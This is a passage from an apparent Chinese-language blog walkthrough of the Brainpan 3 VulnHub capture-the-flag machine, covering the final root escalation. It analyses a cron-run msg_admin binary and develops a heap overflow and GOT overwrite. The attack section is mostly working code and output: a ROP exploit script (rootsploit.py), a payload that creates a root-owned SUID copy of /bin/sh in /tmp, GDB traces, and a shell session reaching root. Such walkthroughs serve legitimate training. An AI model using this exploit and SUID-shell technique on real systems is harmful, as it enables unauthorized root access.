<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan3:/home/puck$ ls -lah /etc/cron.d/</span><br><span class="line">ls -lah /etc/cron.d/</span><br><span class="line">ls -lah /etc/cron.d/</span><br><span class="line">total 16K</span><br><span class="line">drwxr-xr-x  2 root root 4.0K May 20  2015 .</span><br><span class="line">drwxr-xr-x 90 root root 4.0K Feb  6 07:11 ..</span><br><span class="line">-rw-r--r--  1 root root  102 Feb  9  2013 .placeholder</span><br><span class="line">-rw-r--r--  1 root root  100 May 19  2015 msg_admin</span><br><span class="line">puck@brainpan3:/home/puck$ cat /etc/cron.d/msg_admin</span><br><span class="line">cat /etc/cron.d/msg_admin</span><br><span class="line">cat /etc/cron.d/msg_admin</span><br><span class="line">* * * * * root <span class="built_in">cd</span> /opt/.messenger; <span class="keyword">for</span> i <span class="keyword">in</span> *.msg; <span class="keyword">do</span> /usr/<span class="built_in">local</span>/bin/msg_admin 1 <span class="variable">$i</span>; rm -f <span class="variable">$i</span>; <span class="keyword">done</span></span><br><span class="line">puck@brainpan3:/home/puck$ /usr/<span class="built_in">local</span>/bin/msg_admin</span><br><span class="line">/usr/<span class="built_in">local</span>/bin/msg_admin</span><br><span class="line">/usr/<span class="built_in">local</span>/bin/msg_admin</span><br><span class="line">Usage: /usr/<span class="built_in">local</span>/bin/msg_admin priority message.txt</span><br><span class="line">Message file format: requestername|message</span><br><span class="line">Eg: tony|Add a new user to repo</span><br><span class="line">Can have multiple messages <span class="keyword">in</span> a single file separated by newlines.</span><br><span class="line">Eg: tony|Please remove /tmp/foo</span><br><span class="line">    cate|Reset password request.</span><br></pre></td></tr></table></figure>

<p>cron job 从/opt/.messenger文件夹中获取所有.msg文件，并将它们传递给msg_admin可执行文件，然后删除该文件。将可执行文件复制到本地计算机进行分析。</p>
<p>struct_msg</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">struct struct_msg</span><br><span class="line">&#123;</span><br><span class="line">  int Priority;</span><br><span class="line">  char *Requestername;</span><br><span class="line">  char *Msg;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>main</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  void *v3; // esp</span><br><span class="line">  int result; // eax</span><br><span class="line">  int v5; // ebx</span><br><span class="line">  int v6; // ebx</span><br><span class="line">  char *v7; // ebx</span><br><span class="line">  const char *v8; // [esp-18h] [ebp-98h]</span><br><span class="line">  int v9; // [esp-14h] [ebp-94h]</span><br><span class="line">  int v10; // [esp-Ch] [ebp-8Ch]</span><br><span class="line">  const char **v11; // [esp+0h] [ebp-80h]</span><br><span class="line">  int v12; // [esp+4h] [ebp-7Ch]</span><br><span class="line">  char *s; // [esp+Ch] [ebp-74h]</span><br><span class="line">  int v14; // [esp+10h] [ebp-70h]</span><br><span class="line">  int i; // [esp+14h] [ebp-6Ch]</span><br><span class="line">  int v16; // [esp+18h] [ebp-68h]</span><br><span class="line">  int v17; // [esp+1Ch] [ebp-64h]</span><br><span class="line">  int v18; // [esp+20h] [ebp-60h]</span><br><span class="line">  char *dest; // [esp+24h] [ebp-5Ch]</span><br><span class="line">  FILE *stream; // [esp+28h] [ebp-58h]</span><br><span class="line">  void *v21; // [esp+2Ch] [ebp-54h]</span><br><span class="line">  void *v22; // [esp+30h] [ebp-50h]</span><br><span class="line">  char *delim; // [esp+34h] [ebp-4Ch]</span><br><span class="line">  char *src; // [esp+38h] [ebp-48h]</span><br><span class="line">  int v25[10]; // [esp+3Ch] [ebp-44h]</span><br><span class="line">  unsigned int v26; // [esp+64h] [ebp-1Ch]</span><br><span class="line">  int *v27; // [esp+70h] [ebp-10h]</span><br><span class="line"></span><br><span class="line">  v27 = &amp;argc;</span><br><span class="line">  v12 = argc;</span><br><span class="line">  v11 = argv;</span><br><span class="line">  v26 = __readgsdword(0x14u);</span><br><span class="line">  v16 = 0;</span><br><span class="line">  v17 = 10;</span><br><span class="line">  v14 = 0;</span><br><span class="line">  i = 0;</span><br><span class="line">  v18 = 399;</span><br><span class="line">  v3 = alloca(400);</span><br><span class="line">  dest = (char *)&amp;v10;</span><br><span class="line">  <span class="keyword">if</span> ( argc &gt; 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = v11[1];</span><br><span class="line">    v16 = atol(v8);</span><br><span class="line">    stream = fopen(v11[2], <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    s = (char *)malloc(0x190u);</span><br><span class="line">    v21 = malloc(0x14u);</span><br><span class="line">    v22 = malloc(0x64u);</span><br><span class="line">    <span class="keyword">while</span> ( getline((int)&amp;s, (int)&amp;LINEMAX_2, (int)stream) &gt; 0 )</span><br><span class="line">      ++v14;</span><br><span class="line">    v9 = v14;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Recording %d entries\n&quot;</span>, v14);</span><br><span class="line">    rewind(stream);</span><br><span class="line">    <span class="keyword">for</span> ( i = 0; i &lt; v14; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v25[i] = (int)malloc(0xCu);</span><br><span class="line">      *(_DWORD *)v25[i] = v16;</span><br><span class="line">      v5 = v25[i];</span><br><span class="line">      *(_DWORD *)(v5 + 4) = malloc(0xAu);</span><br><span class="line">      v6 = v25[i];</span><br><span class="line">      *(_DWORD *)(v6 + 8) = malloc(0xC8u);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = 0; i &lt; v14; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      delim = <span class="string">&quot;|&quot;</span>;</span><br><span class="line">      <span class="keyword">if</span> ( getline((int)&amp;s, (int)&amp;LINEMAX_2, (int)stream) &gt; 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = s;</span><br><span class="line">        v7[strlen(s) - 1] = 0;</span><br><span class="line">        src = strtok(s, delim);</span><br><span class="line">        strcpy(*(char **)(v25[i] + 4), src);</span><br><span class="line">        src = strtok(0, delim);</span><br><span class="line">        strcpy(*(char **)(v25[i] + 8), src);</span><br><span class="line">        strncpy(dest, *(const char **)(v25[i] + 8), 0x64u);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(stream);</span><br><span class="line">    notify_admin((int)v25, v14);</span><br><span class="line">    result = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    usage((int)*v11);</span><br><span class="line">    result = 1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是经典的内存损坏。对于.msg文件中的每条消息（行），它都会创建一个struct_msg结构并为其变量分配内存，然后将其添加到列表中。接下来，它循环遍历文件，并在“ |”定界符上分割每一行，并将每个部分复制到结构变量“Requestername”和“Msg”。这些变量的固定大小为10（请求者名称）和200（消息）。由于没有检查长度，因此可能破坏内存中的结构指针。以下代码创建一个包含2条消息的.msg文件，每个文件的变量都填充到其最大值，因此不会破坏任何内容。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">import struct</span><br><span class="line"> </span><br><span class="line"><span class="comment"># message 1</span></span><br><span class="line">payload =  10  * <span class="string">&#x27;\x41&#x27;</span> <span class="comment"># A</span></span><br><span class="line">payload += <span class="string">&#x27;|&#x27;</span></span><br><span class="line">payload += 200 * <span class="string">&#x27;\x42&#x27;</span> <span class="comment"># B</span></span><br><span class="line">payload += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"><span class="comment"># message 2</span></span><br><span class="line">payload += 10  * <span class="string">&#x27;\x43&#x27;</span> <span class="comment"># C</span></span><br><span class="line">payload += <span class="string">&#x27;|&#x27;</span></span><br><span class="line">payload += 200 * <span class="string">&#x27;\x44&#x27;</span> <span class="comment"># D</span></span><br><span class="line">payload += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"> </span><br><span class="line">open(<span class="string">&#x27;poc.msg&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(payload)</span><br></pre></td></tr></table></figure>

<p>当使用GDB分析内存时，可以看到如何映射所有内存</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x804c388:    0x00000001    0x0804c398    0x0804c3a8    0x00000011</span><br><span class="line">0x804c398:    0x41414141    0x41414141    0x00004141    0x000000d1</span><br><span class="line">0x804c3a8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3b8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3c8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3d8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3e8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3f8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c408:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c418:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c428:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c438:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c448:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c458:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c468:    0x42424242    0x42424242    0x00000000    0x00000011</span><br><span class="line">0x804c478:    0x00000001    0x0804c488    0x0804c498    0x00000011</span><br><span class="line">0x804c488:    0x43434343    0x43434343    0x00004343    0x000000d1</span><br><span class="line">0x804c498:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c4a8:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c4b8:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c4c8:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c4d8:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c4e8:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c4f8:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c508:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c518:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c528:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c538:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c548:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c558:    0x44444444    0x44444444    0x00000000    0x00020aa1</span><br></pre></td></tr></table></figure>

<p>第一个struct_msg结构位于0x804c388，第二个位于0x804c478。现在，在第一个消息中使用较大的（216字节）“Msg”缓冲区时，将覆盖第二个struct_msg结构的“Requestername”指针，并在下一个strcpy调用中有效控制目标指针和源数据，从而导致Write-允许我们修补GOT条目的任何条件。这段代码将got.strtok地址修补为0x43434343，strtok是strcpy之后执行的下一个函数。我编写了一个ROP有效负载，它通过从3个阶段中添加0xE900来将取自atol的atol的地址加载到eax中，并将该值累加至系统，然后使用参数’/ tmp / foo’调用eax（system），这是一个脚本由我们创建并在执行时将根拥有的SUID shell复制到tmp。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">import struct</span><br><span class="line"> </span><br><span class="line"><span class="comment"># message 1</span></span><br><span class="line"><span class="comment"># .got.plt:0804B05C off_804B05C     dd offset strtok        ; DATA XREF: _strtok</span></span><br><span class="line">payload = 10 * <span class="string">&#x27;\x41&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;|&#x27;</span></span><br><span class="line">payload += 200 * <span class="string">&#x27;\x42&#x27;</span></span><br><span class="line">payload += 12 * <span class="string">&#x27;\x42&#x27;</span></span><br><span class="line"><span class="comment"># overwrite 2nd struct it&#x27;s requestername pointer</span></span><br><span class="line">payload += p(0x0804B05C) <span class="comment"># strtok GOT, becomes 0x43434343</span></span><br><span class="line">payload += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"><span class="comment"># message 2</span></span><br><span class="line">payload += 4 * <span class="string">&#x27;\x43&#x27;</span> <span class="comment"># written to got.strtok</span></span><br><span class="line">payload += <span class="string">&#x27;|&#x27;</span></span><br><span class="line">payload += 200 * <span class="string">&#x27;\x44&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"> </span><br><span class="line">open(<span class="string">&#x27;poc.msg&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(payload)</span><br></pre></td></tr></table></figure>

<p>一些GDB</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/150xw 0x804c388</span><br><span class="line">0x804c388:    0x00000001    0x0804c398    0x0804c3a8    0x00000011</span><br><span class="line">0x804c398:    0x41414141    0x41414141    0x00004141    0x000000d1</span><br><span class="line">0x804c3a8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3b8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3c8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3d8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3e8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3f8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c408:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c418:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c428:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c438:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c448:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c458:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c468:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c478:    0x42424242    0x0804b05c    0x0804c400    0x00000011</span><br><span class="line">0x804c488:    0x00000000    0x00000000    0x00000000    0x000000d1</span><br><span class="line">0x804c498:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c4a8:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c4b8:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c4c8:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c4d8:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c4e8:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c4f8:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c508:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c518:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c528:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c538:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c548:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c558:    0x00000000    0x00000000    0x00000000    0x00020aa1</span><br><span class="line">...</span><br><span class="line">Invalid <span class="variable">$PC</span> address: 0x43434343</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xbffff2ac --&gt; 0x8048ce3 (:    mov    DWORD PTR [ebp-0x48],eax)</span><br><span class="line">0004| 0xbffff2b0 --&gt; 0x0 </span><br><span class="line">0008| 0xbffff2b4 --&gt; 0x8048f4d --&gt; 0x100007c </span><br><span class="line">0012| 0xbffff2b8 --&gt; 0x804c008 --&gt; 0xfbad2488 </span><br><span class="line">0016| 0xbffff2bc (<span class="string">&#x27;B&#x27;</span> repeats 100 <span class="built_in">times</span> <span class="string">&quot;\234, \357\377\267 \360\377\267&quot;</span>)</span><br><span class="line">0020| 0xbffff2c0 (<span class="string">&#x27;B&#x27;</span> repeats 96 <span class="built_in">times</span> <span class="string">&quot;\234, \357\377\267 \360\377\267&quot;</span>)</span><br><span class="line">0024| 0xbffff2c4 (<span class="string">&#x27;B&#x27;</span> repeats 92 <span class="built_in">times</span> <span class="string">&quot;\234, \357\377\267 \360\377\267&quot;</span>)</span><br><span class="line">0028| 0xbffff2c8 (<span class="string">&#x27;B&#x27;</span> repeats 88 <span class="built_in">times</span> <span class="string">&quot;\234, \357\377\267 \360\377\267&quot;</span>)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x43434343 <span class="keyword">in</span> ?? ()</span><br></pre></td></tr></table></figure>

<p>基于GDB的输出，可以看到，如果执行pop（4）小工具，将返回第一条（上一条）消息的“目标”数据，该消息由“strncpy（dest，aMessages [i]”存储在堆栈中]-&gt; Msg，100u）;’。</p>
<h4 id="root所有的一切"><a href="#root所有的一切" class="headerlink" title="root所有的一切"></a>root所有的一切</h4><p>编写了一个ROP payload，通过从3个阶段中添加0xE900来将取自atol的atol的地址加载到eax中，并将该值累加至系统，然后使用参数’/tmp/foo’调用eax（system），这是一个脚本由我创建并在执行时将root拥有的SUID shell复制到tmp。</p>
<p>rootsploit.py</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">import struct</span><br><span class="line">import os</span><br><span class="line"> </span><br><span class="line">def p(v):</span><br><span class="line">    <span class="built_in">return</span> struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, v)</span><br><span class="line"> </span><br><span class="line">__strtok_got    = 0x0804B05C</span><br><span class="line">__atol_got      = 0x0804B04C</span><br><span class="line">__ppppr         = 0x08048DDC</span><br><span class="line">__foo_str       = 0x08048ED8</span><br><span class="line">__int16_e800h   = 0x080480C7</span><br><span class="line">__int16_0100h   = 0x08048093</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">rop  = p(0x08048790)</span><br><span class="line">rop += p(0x08048E06)</span><br><span class="line">rop += p((__atol_got - 0x01270304) &amp; 0xFFFFFFFF)</span><br><span class="line">rop += p(0x08048FEB)</span><br><span class="line">rop += p(0x08048E06)</span><br><span class="line">rop += p((__int16_e800h - 0x01270304) &amp; 0xFFFFFFFF)</span><br><span class="line">rop += p(0x08048FEB)</span><br><span class="line">rop += p(0x08048E06)</span><br><span class="line">rop += p((__int16_0100h - 0x01270304) &amp; 0xFFFFFFFF)</span><br><span class="line">rop += p(0x08048FEB)</span><br><span class="line">rop += p(0x08048786)</span><br><span class="line">rop += p(__foo_str + 23)</span><br><span class="line"> </span><br><span class="line">payload = 10 * <span class="string">&#x27;A&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;|&#x27;</span></span><br><span class="line">payload += rop.ljust(212, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># padding till 212 eq next struct requestername pointer</span></span><br><span class="line">payload += p(0x0804B05C) <span class="comment"># strtok GOT, becomes __ppppr</span></span><br><span class="line">payload += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">payload += p(__ppppr) <span class="comment"># written to got.strtok</span></span><br><span class="line">payload += <span class="string">&#x27;|&#x27;</span></span><br><span class="line">payload += 200 * <span class="string">&#x27;A&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"> </span><br><span class="line">open(<span class="string">&#x27;exploit.msg&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(payload)</span><br><span class="line">foocode = <span class="string">&quot;cp /bin/sh /tmp/r00tsh3ll;chown root:root /tmp/r00tsh3ll;chmod 4755 /tmp/r00tsh3ll&quot;</span></span><br><span class="line">open(<span class="string">&#x27;/tmp/foo&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(foocode)</span><br><span class="line">os.system(<span class="string">&#x27;chmod +x /tmp/foo&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>从tmp文件夹执行漏洞利用脚本，并将创建的exploit.msg移至/opt/.messenger文件夹，然后稍等。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan3:/tmp$ python rootsploit.py</span><br><span class="line">python rootsploit.py</span><br><span class="line">python rootsploit.py</span><br><span class="line">puck@brainpan3:/tmp$ ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">total 20K</span><br><span class="line">drwxrwxrwt  2 root   root   4.0K Feb  6 13:03 .</span><br><span class="line">drwxr-xr-x 21 root   root   4.0K Jun 17  2015 ..</span><br><span class="line">-rw-r--r--  1 puck   dev     434 Feb  6 13:03 exploit.msg</span><br><span class="line">-rwxr-xr-x  1 puck   dev      82 Feb  6 13:03 foo</span><br><span class="line">-rwxrwxrwx  1 anansi webdev 1.1K Feb  6 12:59 rootsploit.py</span><br><span class="line">puck@brainpan3:/tmp$ mv exploit.msg /opt/.messenger/</span><br><span class="line">mv exploit.msg /opt/.messenger/</span><br><span class="line">mv exploit.msg /opt/.messenger/</span><br><span class="line">puck@brainpan3:/tmp$ ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">total 16K</span><br><span class="line">drwxrwxrwt  2 root   root   4.0K Feb  6 13:03 .</span><br><span class="line">drwxr-xr-x 21 root   root   4.0K Jun 17  2015 ..</span><br><span class="line">-rwxr-xr-x  1 puck   dev      82 Feb  6 13:03 foo</span><br><span class="line">-rwxrwxrwx  1 anansi webdev 1.1K Feb  6 12:59 rootsploit.py</span><br><span class="line">puck@brainpan3:/tmp$ ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">total 16K</span><br><span class="line">drwxrwxrwt  2 root   root   4.0K Feb  6 13:03 .</span><br><span class="line">drwxr-xr-x 21 root   root   4.0K Jun 17  2015 ..</span><br><span class="line">-rwxr-xr-x  1 puck   dev      82 Feb  6 13:03 foo</span><br><span class="line">-rwxrwxrwx  1 anansi webdev 1.1K Feb  6 12:59 rootsploit.py</span><br><span class="line">puck@brainpan3:/tmp$ ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">total 128K</span><br><span class="line">drwxrwxrwt  2 root   root   4.0K Feb  6 13:04 .</span><br><span class="line">drwxr-xr-x 21 root   root   4.0K Jun 17  2015 ..</span><br><span class="line">-rwxr-xr-x  1 puck   dev      82 Feb  6 13:03 foo</span><br><span class="line">-rwsr-xr-x  1 root   root   110K Feb  6 13:04 r00tsh3ll</span><br><span class="line">-rwxrwxrwx  1 anansi webdev 1.1K Feb  6 12:59 rootsploit.py</span><br><span class="line">puck@brainpan3:/tmp$ ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">total 128K</span><br><span class="line">drwxrwxrwt  2 root   root   4.0K Feb  6 13:04 .</span><br><span class="line">drwxr-xr-x 21 root   root   4.0K Jun 17  2015 ..</span><br><span class="line">-rwxr-xr-x  1 puck   dev      82 Feb  6 13:03 foo</span><br><span class="line">-rwsr-xr-x  1 root   root   110K Feb  6 13:04 r00tsh3ll</span><br><span class="line">-rwxrwxrwx  1 anansi webdev 1.1K Feb  6 12:59 rootsploit.py</span><br><span class="line">puck@brainpan3:/tmp$ ./r00tsh3ll</span><br><span class="line">./r00tsh3ll</span><br><span class="line">./r00tsh3ll</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">id</span><br><span class="line">uid=1001(puck) gid=1004(dev) euid=0(root) groups=0(root)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">ls</span><br><span class="line">brainpan.8.gz</span><br><span class="line"><span class="comment"># ls -la</span></span><br><span class="line">ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 20</span><br><span class="line">drwx------  2 root root 4096 Jul 16  2015 .</span><br><span class="line">drwxr-xr-x 21 root root 4096 Jun 17  2015 ..</span><br><span class="line">-rw-------  1 root root    0 Jul 16  2015 .bash_history</span><br><span class="line">-rw-------  1 root root 3106 Feb 19  2014 .bashrc</span><br><span class="line">-rw-------  1 root root  140 May 31  2015 .profile</span><br><span class="line">-rw-------  1 root root  314 Jun 23  2015 brainpan.8.gz</span><br></pre></td></tr></table></figure>

<p>成功的取得了root权限</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub205.jpg"></p>
<p>将其中的brainpan.8.gz复制到/home/anansi文件夹，然后开启python的SimpleHTTPServer，将brainpan.8.gz下载之后解压，读取其中的内容，发现如下所示的文本，正好是flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3<span class="comment"># file brainpan.8 </span></span><br><span class="line">brainpan.8: troff or preprocessor input, ASCII text</span><br><span class="line">root@kali:~/vulnhub/brainpan3<span class="comment"># cat brainpan.8 </span></span><br><span class="line">.TH man 8 <span class="string">&quot;20 May 2015&quot;</span> <span class="string">&quot;3.0&quot;</span> <span class="string">&quot;brainpan 3&quot;</span></span><br><span class="line"></span><br><span class="line">.SH DESCRIPTION</span><br><span class="line">Congratulations, you win! Thanks <span class="keyword">for</span> playing!</span><br><span class="line"></span><br><span class="line">.SH FLAG</span><br><span class="line">.B</span><br><span class="line">flag&#123;tricksy-hobbitses-use-unix&#125;</span><br><span class="line"></span><br><span class="line">.SH BUGS</span><br><span class="line">You found them all. </span><br><span class="line"></span><br><span class="line">.SH AUTHOR</span><br><span class="line">superkojiman - </span><br><span class="line">.B</span><br><span class="line">http://blog.techorganic.com</span><br><span class="line"></span><br><span class="line">.SH TESTERS</span><br><span class="line">Special thanks go to barrebas and Swappage taking the time to <span class="built_in">test</span> Brainpan 3!</span><br><span class="line">.br</span><br><span class="line">barrebas - </span><br><span class="line">.B</span><br><span class="line">https://twitter.com/barrebas</span><br><span class="line">.br</span><br><span class="line">Swappage - </span><br><span class="line">.B</span><br><span class="line">https://twitter.com/Swappage</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub206.jpg"></p>
<h4 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h4><ul>
<li>缓冲区溢出</li>
<li>堆栈溢出</li>
<li>字符串格式漏洞</li>
<li>反引号命令注入</li>
<li><blockquote>
<p>&amp;2管道命令输出</p>
</blockquote>
</li>
<li>python的pwntools模块使用编写poc</li>
<li>pwndbg调试shellcode</li>
<li>ROPGadget找到清晰的eax小工具</li>
<li>偏移量累积寻找</li>
</ul>
<p><font color="red">Game over</font></p>
<p>这次傻瓜式一键通关脚本就在方法一的尾部，enjoy it …</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
</search>
